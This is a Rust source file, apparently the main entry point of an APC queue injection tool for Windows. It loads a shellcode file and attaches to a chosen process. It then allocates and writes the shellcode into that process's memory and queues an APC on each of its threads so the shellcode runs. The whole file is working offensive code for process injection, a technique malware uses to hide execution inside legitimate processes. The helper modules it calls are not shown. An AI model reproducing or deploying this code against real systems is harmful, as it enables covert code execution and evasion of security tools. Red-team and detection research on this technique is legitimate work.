//! OEP for APC Injection script.
#![allow(dead_code)]

mod wrapper;
mod helper;

use dotenv::dotenv;
use helper::shellcode::parse_shellcode_path;
use wrapper::thread::enumerate_threads;
use log::{ error, info }; // Log level supplementing `env_logger`.

use std::{
    env::{ Args, args },
    process::exit
};

use wrapper::{
    args::ProcessArgs,
    process::{ RemoteProcess, attach_to_process }
};

fn parse_args(mut args: Args) -> Result<(Vec<u8>, ProcessArgs), ()> {
    // With the args as a vector of strings, parse/validate
    // these and return in order of appearance.

    let shellcode_parsed 
        = parse_shellcode_path(args.nth(1)).unwrap_or_else(|err| {

            error!("{}", err);
            exit(1);
        });

    info!("Parsed input shellcode dump successfully");

    // Process trailing, process-specific arguments
    // following shellcode path.
    let trailing_parsed: Vec<String> = args.collect();

    Ok((
        shellcode_parsed,
        ProcessArgs::parse_into(&trailing_parsed.as_slice())?
    ))
}

fn allocate_write_shellcode(p_inst: &mut RemoteProcess, shellcode: Vec<u8>) -> Result<(), ()> {
    // Injects contents of the foremost path argument to the
    // target process. 

    p_inst.allocate_memory(shellcode.len() as usize).unwrap_or_else(|allocate_err| {

        error!("Failed to allocate memory to process: {}", allocate_err);
        exit(1);
    });

    p_inst.write_to_memory(shellcode).unwrap_or_else(|write_err| {

        error!("Failed to write to target process memory: {}", write_err);
        exit(1);
    });

    Ok(())
}

fn queue_apc_on_threads(p_inst: &mut RemoteProcess) -> Result<(), ()> {
    // After allocation and injection, enumerate threads in the
    // target process and queue the APC (address of injected shellcode)
    // for execution.

    let mut t_collection = enumerate_threads(p_inst).unwrap_or_else(|enumerate_err| {

        error!("Failed to enumerate process threads: {}", enumerate_err);
        exit(1);
    });

    for t_inst in t_collection.iter_mut() {

        if t_inst.create_handle().is_err() {

            error!("Failed to create handle to thread.");
            continue;
        }

        t_inst.queue_apc_routine(p_inst).unwrap_or_else(|queue_err| {

            error!("Failed to queue APC: {}", queue_err);
        });
    }

    Ok(())
}

fn main() {
    
    if !cfg!(windows) { error!("Incompatible platform."); exit(1); }

    // Initialise logger and override default
    // log level to permit use of `info!`.
    env_logger::init();
    dotenv().ok();

    if let Ok((shellcode, p_identifier)) = parse_args(args()) {

        let mut p_handle = attach_to_process(p_identifier).unwrap_or_else(|err| {

            error!("{}", err);
            exit(1);
        });

        let _ = allocate_write_shellcode(&mut p_handle, shellcode);

        let _ = queue_apc_on_threads(&mut p_handle);

        info!("Finished attempt of APC queue injection across threads. Awaiting execution if successful...");
    }
}